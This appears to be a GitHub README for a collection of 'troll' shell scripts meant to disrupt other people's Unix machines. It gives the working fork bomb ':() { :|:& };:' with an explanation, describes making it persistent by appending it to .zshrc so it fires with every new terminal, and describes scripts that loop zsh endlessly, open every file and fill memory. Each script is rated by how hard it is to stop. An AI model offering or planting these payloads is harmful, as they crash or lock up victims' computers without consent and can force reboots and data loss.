# troll
This is a collection of unix shell scripts for trolling purposes. And yes, I have tested all of these on my own machine (a mac).

For all code that saves to `.zshrc` I put a padding of `0A` (new line) to make sure it works

For each script, I give it a rating with bombs. More bombs = more troll and harder to stop


### fork_bomb_always ðŸ’£ðŸ’£ðŸ’£
This script will only update the `.zshrc` file to include a simple fork bomb. Updating `.zshrc` means that upon opening a new terminal, the process will start.

This command can be shortened by removing the `cd &&` as this only guarantees that the file will be updated correctly.

To stop this you will probably need to restart your machine and delete the last line of the `.zshrc` file.


### simple_fork_bomb ðŸ’£ðŸ’£
The code is `:() { :|:& };:`. Basically you are creating a function called `:`, bash functions are in the format of `name () { commands; in; function }`. Inside the fucntion you are calling `:`, piping its output to another instance of `:` and putting this process in the background using `&`. The killer is after defining the function, you finally call it again at the end.


### infinite_zsh ðŸ’£
This script will attempt to start an instance of `zsh` upon opening a new terminal which as zsh is saved in `.zshrc`, will result in an unlimited loop.


### open_all ðŸ’£ðŸ’£
This is a script that will look for everything, then open it. The bomb rating isn't high because just finding all the files is a relatively slow process.


### full_mem ðŸ’£ðŸ’£
First merge by [rcabezas29](https://github.com/veryheavypickle/troll/commits?author=rcabezas29). Havne't tested it, am scared.
